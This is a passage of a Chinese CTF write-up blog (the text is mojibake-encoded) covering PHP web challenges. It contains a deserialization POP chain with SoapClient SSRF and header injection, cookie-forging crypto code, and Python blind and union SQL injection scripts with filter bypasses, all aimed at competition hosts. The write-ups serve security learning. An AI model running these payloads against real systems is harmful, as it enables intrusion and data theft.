class="class"></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $name;</span><br><span class="line">        <span class="keyword">public</span> $flag;</span><br><span class="line">        <span class="keyword">public</span> $b;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getflag</span><span class="params">()</span>  æ­¤å¤„å¯<span class="title">ssrf</span>ï¼Œåˆ°å¤´äº†</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">                session_start(); </span><br><span class="line">                var_dump($_SESSION);</span><br><span class="line">                $a = <span class="keyword">array</span>(reset($_SESSION),<span class="keyword">$this</span>-&gt;flag);</span><br><span class="line">                <span class="keyword">echo</span> call_user_func(<span class="keyword">$this</span>-&gt;b,$a);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ee</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $str1;</span><br><span class="line">        <span class="keyword">public</span> $str2;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;str1-&gt;&#123;<span class="keyword">$this</span>-&gt;str2&#125;(); æœ‰å­—ç¬¦ä¸²äº†ï¼Œåªæœ‰ä»–èƒ½è°ƒç”¨å¯¹è±¡çš„æ–¹æ³•ï¼Œå½“ç„¶æ˜¯ssrf</span><br><span class="line">                <span class="keyword">return</span> <span class="string">"1"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$a = $_POST[<span class="string">'aa'</span>];</span><br><span class="line">unserialize($a);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>encode.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">en_crypt</span><span class="params">($content,$key)</span></span>&#123;</span><br><span class="line">    $key    =    md5($key);</span><br><span class="line">    $h      =    <span class="number">0</span>;</span><br><span class="line">    $length    =    strlen($content);</span><br><span class="line">    $swpuctf      =    strlen($key);</span><br><span class="line">    $varch   =    <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">for</span> ($j = <span class="number">0</span>; $j &lt; $length; $j++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> ($h == $swpuctf)</span><br><span class="line">        &#123;</span><br><span class="line">            $h = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $varch .= $key&#123;$h&#125;;</span><br><span class="line">        </span><br><span class="line">        $h++;</span><br><span class="line">    &#125;</span><br><span class="line">    $swpu  =  <span class="string">''</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> ($j = <span class="number">0</span>; $j &lt; $length; $j++)</span><br><span class="line">    &#123;</span><br><span class="line">        $swpu .= chr(ord($content&#123;$j&#125;) + (ord($varch&#123;$j&#125;)) % <span class="number">256</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> base64_encode($swpu);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ‰¾åˆ°ä¸å¯è¯»çš„æ–¹æ³• <code>get_flag</code>ï¼Œå¾—çŸ¥è¦ç‚¹ï¼š</p><p>get_flag  only admin in 127.0.0.1 can get_flag</p><ul><li>ssrf needed</li><li>POPchain needed</li><li>decrypt and be admin</li></ul><p>å…ˆçœ‹popchain</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">bb-&gt;__destruct &#x2F;&#x2F;$mod1 ä¸ºaaå¯¹è±¡</span><br><span class="line">    -&gt;aa -&gt;_call()-&gt;$s1(); &#x2F;&#x2F;$éœ€è¦è°ƒç”¨çš„$s1æ˜¯ä¸ªå¯¹è±¡</span><br><span class="line">        -&gt;cc-&gt; __invoke()-&gt; &#x2F;&#x2F;æ‹¼æ¥ï¼Œéœ€è¦å±æ€§æ˜¯å­—ç¬¦ä¸²</span><br><span class="line">            ee-&gt;_toString()-&gt; &#x2F;&#x2F;$str1æ˜¯ddå¯¹è±¡-&gt;getflag()</span><br><span class="line">                dd-&gt;getflag()</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">aa</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $mod1;</span><br><span class="line">        <span class="keyword">public</span> $mod2;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">bb</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $mod1;</span><br><span class="line">        <span class="keyword">public</span> $mod2;</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">cc</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $mod1;</span><br><span class="line">        <span class="keyword">public</span> $mod2;</span><br><span class="line">        <span class="keyword">public</span> $mod3;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">dd</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $name;</span><br><span class="line">        <span class="keyword">public</span> $flag;</span><br><span class="line">        <span class="keyword">public</span> $b;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ee</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $str1;</span><br><span class="line">        <span class="keyword">public</span> $str2;</span><br><span class="line">&#125;</span><br><span class="line">$ee=<span class="keyword">new</span> ee();</span><br><span class="line">$ee-&gt;str1=<span class="keyword">new</span> dd();</span><br><span class="line">$ee-&gt;str2=<span class="string">'getflag'</span>;</span><br><span class="line">$cc=<span class="keyword">new</span> cc();</span><br><span class="line">$cc-&gt;mod3=<span class="string">'1'</span>;</span><br><span class="line">$cc-&gt;mod1=$ee;</span><br><span class="line">$aa=<span class="keyword">new</span> aa();</span><br><span class="line">$aa-&gt;mod1=$cc;</span><br><span class="line">$aa-&gt;mod2=<span class="keyword">array</span>(<span class="string">'test2'</span>=&gt;&amp;$aa-&gt;mod1);</span><br><span class="line">$bb=<span class="keyword">new</span> bb();</span><br><span class="line">$bb-&gt;mod1=$aa;</span><br><span class="line"></span><br><span class="line">$ee-&gt;str1-&gt;b=<span class="string">'call_user_func'</span>;</span><br><span class="line">$ee-&gt;str1-&gt;flag=<span class="string">'get_flag'</span>;</span><br><span class="line">$sa=serialize($bb);</span><br><span class="line"><span class="keyword">echo</span> $sa;</span><br></pre></td></tr></table></figure><p>è¿™é¢˜ç±»ä¼¼bestphpâ€™srevengeï¼Œæ‰€ä»¥å‰é¢çš„é“¾å¥½äº†åå¯ä»¥ç›´æ¥æŠŠgetflag()ç”¨åˆ°çš„ä¸¤ä¸ªå‚æ•°å¡«å¥½ã€‚åŸç†æ˜¯ä¸€æ ·çš„ã€‚<br>é“¾å­å¥½äº†,å›å¤´çœ‹çœ‹è§£ç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">de_crypt</span><span class="params">($swpu,$key)</span></span>&#123;</span><br><span class="line">    $swpu=base64_decode($swpu);</span><br><span class="line">    $key=md5($key);</span><br><span class="line">    $h=<span class="number">0</span>;</span><br><span class="line">    $length=strlen($swpu);</span><br><span class="line">    $swpuctf=strlen($key);</span><br><span class="line">    $varch=<span class="string">''</span>;</span><br><span class="line">    <span class="keyword">for</span>($j=<span class="number">0</span>;$j&lt;$length;$j++)&#123;</span><br><span class="line">        <span class="keyword">if</span>($h==$swpuctf)</span><br><span class="line">        &#123;</span><br><span class="line">            $h=<span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $varch.=$key&#123;$h&#125;;</span><br><span class="line">        $h++;</span><br><span class="line">    &#125;</span><br><span class="line">    $content=<span class="string">''</span>;</span><br><span class="line">    <span class="keyword">for</span>($j=<span class="number">0</span>;$j&lt;$length;$j++)</span><br><span class="line">    &#123;</span><br><span class="line">        $content.= chr(ord($swpu&#123;$j&#125;) - (ord($varch&#123;$j&#125;))+<span class="number">256</span> % <span class="number">256</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $content;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è§£ç cookieå¾—åˆ°<code>xiaoC:3</code><br>é‚£å°±åŠ å¯†ä¼ªé€ admin<br><code>admin:1 xZmdm9NxaQ==</code></p><p>ç°åœ¨å·®ä¸€ä¸ªSopaæ‰“127.0.0.1è°ƒç”¨getflag<br>éœ€è¦æ³¨æ„çš„æ˜¯<br>interface.phpå·²ç»æœ‰ç°æˆçš„soapæ¥å£äº†ï¼Œæ‰€ä»¥ä¸èƒ½ç›´æ¥è®¿é—®index.phpè°ƒç”¨get_flagã€‚è€Œæ˜¯é€šè¿‡call_user_funcè°ƒç”¨SoapClientç±»çš„get_flagæ–¹æ³•å³è°ƒç”¨äº†Serviceç±»çš„get_flagæ–¹æ³•<br>å…ˆå°†æ•°æ®å†™å…¥session</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span></span><br><span class="line">$target = <span class="string">'http://127.0.0.1/interface.php'</span>;</span><br><span class="line">$headers = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">'X-Forwarded-For: 127.0.0.1'</span>,</span><br><span class="line">    <span class="string">'Cookie: user=xZmdm9NxaQ=='</span>,</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">$b = <span class="keyword">new</span> SoapClient(<span class="keyword">null</span>, <span class="keyword">array</span>(<span class="string">'location'</span> =&gt; $target, <span class="string">'user_agent'</span>=&gt;<span class="string">'byc^^Content-Type: application/x-www-form-urlencoded^^'</span>.join(<span class="string">'^^'</span>,$headers),<span class="string">'uri'</span>=&gt;<span class="string">'aabb'</span>));</span><br><span class="line">$a = serialize($b);</span><br><span class="line">$a = str_replace(<span class="string">'^^'</span>, <span class="string">"\r\n"</span>, $a);</span><br><span class="line"><span class="keyword">echo</span> $a;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>åˆ©ç”¨è¡¨å•ä¼ è¿›session</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"http://04bda212-e690-478a-99d5-846e353f75ca.node3.buuoj.cn/index.php"</span> <span class="attr">method</span>=<span class="string">"POST"</span> <span class="attr">enctype</span>=<span class="string">"multipart/form-data"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"PHP_SESSION_UPLOAD_PROGRESS"</span> <span class="attr">value</span>=<span class="string">"1"</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"file"</span> <span class="attr">name</span>=<span class="string">"file"</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>åŠ ä¸Šä¸Šé¢é“¾å­çš„payload.å³å¯get_flag</p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> WEB </tag>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XCTFé«˜æ ¡æˆ˜â€œç–«â€ç½‘ç»œå®‰å…¨åˆ†äº«èµ›</title>
      <link href="2020/03/10/XCTF%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9B/"/>
      <url>2020/03/10/XCTF%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9B/</url>
      
        <content type="html"><![CDATA[<p>èŒæ–°ç¬¬ä¸€æ¬¡xctfè‡ªé—­äº†ã€‚<br>ç¬¬ä¸€æ¬¡ä»£è¡¨X1cæ‰“æ¯”èµ›ï¼Œç»“æœè¾“å‡ºè´¼ä½ï¼Œå‡ ä¹å°±å®Œæ•´è´¡çŒ®ä¸€é“é¢˜ã€‚æœ‰å‡ é“åŸºæœ¬åˆ°ä½äº†ä¹Ÿæ²¡åšå‡ºæ¥ï¼Œæ²¡èƒ½åˆ†æ‹…é˜Ÿå‹å‹åŠ›â€¦..ä½†æ˜¯æœ€åé˜Ÿä¼æ‹¿åˆ°ç¬¬8åæŒºå¼ºçš„ï¼Œå…¶ä»–å¸ˆå‚…å¤ªç»™åŠ›äº†ï¼Œä¸­é—´æœ‰æ®µæ—¶é—´è¿˜å†²åˆ°äº†ç¬¬å››åï¼Œåªä¸è¿‡å¤§å®¶å› ä¸ºè¦ä¸Šè¯¾å°±éƒ½ç¡è§‰å»äº†hhhã€‚</p><p>æ‰€ä»¥è¶ç€å…¶ä»–æˆ˜é˜Ÿçš„wpå‡ºæ¥è‡ªå·±å…ˆæŠŠå‡ é“è‡ªå·±å½“æ—¶æ¥è§¦äº†çš„é¢˜ç›®ä»¥åŠæ²¡å®Œæ•´åšå‡ºæ¥çš„é¢˜ç›®å°ç»“ä¸‹ã€‚é¡ºä¾¿æé†’è‡ªå·±è¦åŠ ç´§æŸ¥æ¼è¡¥ç¼ºäº†ã€‚</p><a id="more"></a><h1 id="nweb"><a href="#nweb" class="headerlink" title="nweb"></a>nweb</h1><p>è¿™é“é¢˜åŸºæœ¬ç®—æ˜¯å®Œæ•´åšå‡ºæ¥äº†ã€‚åªæ˜¯è€ƒç‚¹æœ‰ç‚¹å‘ã€‚éƒ½çŸ¥é“æœ‰æ³¨å…¥ä½†æ˜¯å°±æ˜¯éš¾æ‰¾ã€‚<br>å®é™…ä¸Šåœ¨æ³¨å†Œé¡µé¢æœ‰æ³¨é‡Šæé†’typeå‚æ•°110æ—¶ä¼šä¸ä¸€æ ·ã€‚å¹¶ä¸”ä¹‹å‰ç™»é™†è¿›å»é¡µé¢ä¸­æœ‰å‡ºé¢˜äººæç¤ºçš„â€æ³¨å†Œè´¦æˆ·ä¹Ÿæœ‰ç­‰çº§ä¹‹åˆ†â€ï¼Œæ‰€ä»¥å¯ä»¥åœ¨æ³¨å†Œæ—¶å°±å°†typeè°ƒä¸º110ã€‚ç™»é™†è¿›å»å°±å¯ä»¥åœ¨search.phpè¿›è¡Œæ³¨å…¥äº†ã€‚<br>(ä½†æ˜¯è¿™ä¸ªåŒºåˆ†ç‚¹å°±å¾ˆæ— è¯­ï¼Œæ²¡å•¥å«é‡‘é‡ï¼Œåååˆèƒ½éš¾å€’ä¸€å †äºº)</p><p>è¿›å»åä¸€ä¸ªæ™®é€šçš„ç›²æ³¨äº†ã€‚åªä¸è¿‡è¿‡æ»¤äº†å…³é”®å­—ç½®ä¸ºç©ºï¼Œå¯ä»¥åŒå†™ç»•è¿‡ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">s=requests.session()</span><br><span class="line">url=<span class="string">'http://121.37.179.47:1001/regist.php'</span></span><br><span class="line">url2=<span class="string">'http://121.37.179.47:1001/login.php'</span></span><br><span class="line">url3=<span class="string">'http://121.37.179.47:1001/search.php'</span></span><br><span class="line">flag=<span class="string">''</span></span><br><span class="line">s.post(url, data=&#123;<span class="string">'email'</span>: <span class="string">'byc_409'</span>, <span class="string">'pass'</span>: <span class="string">'123'</span>, <span class="string">'repass'</span>: <span class="string">'123'</span>, <span class="string">'type'</span>: <span class="string">'110'</span>&#125;)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    print(i)</span><br><span class="line">    a=<span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">32</span>,<span class="number">128</span>):</span><br><span class="line">        s.post(url2, data=&#123;<span class="string">'email'</span>: <span class="string">'byc_409'</span>, <span class="string">'pass'</span>: <span class="string">'123'</span>&#125;)<span class="comment">#admin,fl4g,jd,user</span></span><br><span class="line">        payload = <span class="string">"1' or ascii(substr((selselectect group_concat(flag) frfromom fl4g),"</span>+str(i)+<span class="string">",1))="</span>+str(j)+<span class="string">"#"</span></span><br><span class="line">        r = s.post(url3, data=&#123;<span class="string">'flag'</span>: payload&#125;)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'no'</span> <span class="keyword">not</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            flag+=chr(j)</span><br><span class="line">            print(flag)</span><br><span class="line">            a=<span class="number">1</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> a==<span class="number">0</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>æ³¨å‡ºæ¥åªèƒ½å¾—åˆ°è´¦å·å¯†ç (md5)ï¼ŒåŠ ä¸Šä¸€ä¸ªåªæœ‰ä¸€éƒ¨åˆ†çš„flagã€‚åªèƒ½ç»§ç»­è¿›åå°äº†ã€‚ç”±äºä¹‹å‰æ‰«ç›®å½•å¾—åˆ°è¿‡admin.htmlã€‚ç›´æ¥ç™»å½•ï¼Œå‘ç°æ˜¯ä¸ªæ‰«æå™¨<img src="/2020/03/10/XCTF%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9B/1.PNG" class="lazyload" data-srcset="1.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="sql"><br>ç”±äºæˆ‘å‰å‡ å¤©æ‰æ¥å—çš„æ ¡é˜Ÿè€ƒæ ¸å°±æ˜¯mysql load data infileçš„çŸ¥è¯†ç‚¹ï¼ŒåŠ ä¸Šè·‘å‡ºæ¥çš„flagæ˜¯mysql-rogue-serverï¼Œé©¬ä¸Šå°±èƒ½æƒ³åˆ°ä½¿ç”¨Mysql-Rogue-Serverè§£å†³ã€‚è§£å†³æ–¹æ³•å¾ˆç®€å•å°±æ˜¯åœ¨æœåŠ¡å™¨è·‘è„šæœ¬å°±å®Œäº†ï¼Œä½†å…¶å®åŸç†æŒºéº»çƒ¦çš„ã€‚ç®€å•è§£é‡Šå°±æ˜¯æˆ‘ä»¬åˆ©ç”¨ load data infileçš„ç‰¹æ€§ï¼Œå¯ä»¥ç”¨è„šæœ¬ä¼ªé€ mysqlä¼ è¾“æ•°æ®åŒ…ã€‚åªè¦è¿™æ ·å°±èƒ½è¿”å›æœåŠ¡å™¨ä¸Šçš„ä»»æ„æ–‡ä»¶è¯»å–ã€‚<br>ä¸è¿‡è¿™é¢˜pythonè„šæœ¬ä¸å¤§è¡Œçš„æ ·å­ï¼Œç”¨phpè„šæœ¬è§£å†³é—®é¢˜ï¼Œè¯»<code>flag.php</code>å°±å¾—åˆ°å‰©ä¸‹çš„flagã€‚</p><h1 id="PHP-UAF"><a href="#PHP-UAF" class="headerlink" title="PHP-UAF"></a>PHP-UAF</h1><p>è¿™é¢˜åŸºæœ¬æ²¡å•¥æŠ€æœ¯éš¾åº¦ï¼Œä¸»è¦å°±æ˜¯è·‘è„šæœ¬äº†ã€‚æœ¬æ¥éšä¾¿æµ‹æµ‹çš„ï¼Œå‘ç°ç¦ç”¨ç³»ç»Ÿå‡½æ•°ä»¥åŠä¸€ä¸ªopen_basedirã€‚é‚£å°±çœ‹ä¸‹ç›®å½•å§ï¼Œå‘ç°çªç„¶å¤šäº†å¥½å¤šphpæ–‡ä»¶ï¼Œç»™å¸ˆå‚…çœ‹çœ‹å‘ç°å°±æ˜¯ä¸Šæ¬¡å…¬ç›Šèµ›easy_thinkingçš„bypassè„šæœ¬<a href="https://github.com/mm0r1/exploits/blob/master/php7-gc-bypass/exploit.php" target="_blank" rel="noopener">https://github.com/mm0r1/exploits/blob/master/php7-gc-bypass/exploit.php</a><br>é‚£å°±ç”¨å°±å®Œäº‹äº†ã€‚ç›´æ¥copyå‡½æ•°ç”¨äº†ååŒ…å«ä¸€ä¸‹å‘½ä»¤æ‰§è¡Œå³å¯ã€‚<br>è¿™é¢˜éƒå¸ˆå‚…éšæ‰‹åšçš„ï¼Œè²Œä¼¼å› ä¸ºæ…å±åŸå› åˆ·äº†åå‡ åˆ†é’Ÿæ‰å‡ºæ¥ã€‚<br>è‡³äºä¸ºä»€ä¹ˆä¼šæ…å±ï¼Œéšä¾¿æ”¾ä¸€ä¸‹æ¯”èµ›æ—¶è¯»åˆ°çš„åˆ«é˜Ÿå¤§ä½¬phpå‘½ä»¤<br><img src="/2020/03/10/XCTF%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9B/2.PNG" class="lazyload" data-srcset="2.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><h1 id="easy-trick-gzmtu"><a href="#easy-trick-gzmtu" class="headerlink" title="easy_trick_gzmtu"></a>easy_trick_gzmtu</h1><p>è¿™é¢˜ä¸æƒ³è¯´å•¥äº†ã€‚å°±æ˜¯å‘ã€‚èµ›åçœ‹çœ‹Nu1lçš„è§£é¢˜è„šæœ¬åï¼Œå‘ç°è¦ç”¨<br><code>\u\n\i\o\n \s\e\l\e\c\t</code>è¿™ç§è¯­å¥ã€‚æ‰€ä»¥å®ƒæºç åº”è¯¥æ˜¯ç›´æ¥æŠŠå‚æ•°<br>timeæ‹¿è¿›å‡½æ•°dateä¸€æŠŠæ¢­â€¦â€¦â€¦..<br><img src="/2020/03/10/XCTF%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9B/3.PNG" class="lazyload" data-srcset="3.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="date"></p><p>è¿™è°æƒ³å¾—åˆ°ï¼ŒçœŸçš„æ— è¯­ã€‚<br>åé¢ä¸€ä¸ªååºåˆ—åŒ–çš„trick,ä¸æƒ³å¤šè¯´äº†ã€‚</p><p>å¥½å§ï¼Œå®˜æ–¹wpé‡Œå‘ç°è¿™é¢˜å‡ºé¢˜äººæ­åœ¨è‡ªå·±æœåŠ¡å™¨ä¸Šï¼Œæ¥å¤ç°ä¸€æ³¢ã€‚<br>æ³¨å…¥ä¸è¯´äº†</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">let=string.ascii_lowercase+<span class="string">"_.()"</span></span><br><span class="line">exp=<span class="string">''</span></span><br><span class="line">payload=<span class="string">"1' union select 1,(select group_concat(passwd) from admin),3#"</span><span class="comment"># /eGlhb2xldW5n</span></span><br><span class="line"><span class="keyword">for</span> ch <span class="keyword">in</span> payload:</span><br><span class="line">    <span class="keyword">if</span> ch <span class="keyword">in</span> let:</span><br><span class="line">        ch=<span class="string">"\\"</span>+ch</span><br><span class="line">    exp+=ch</span><br><span class="line">print(exp)</span><br><span class="line"></span><br><span class="line">url=<span class="string">'http://eqwerqwrfweryu.mycute.cn/?time='</span></span><br><span class="line">r=requests.get(url+urllib.parse.quote(exp))</span><br><span class="line">page=re.findall(<span class="string">r'&lt;div class="text-c "&gt;(.*?)&lt;/div&gt;'</span>,r.text)[<span class="number">0</span>]</span><br><span class="line">print(page)</span><br></pre></td></tr></table></figure><p>ç„¶åä¸€ä¸ªssrfè¯»æºç 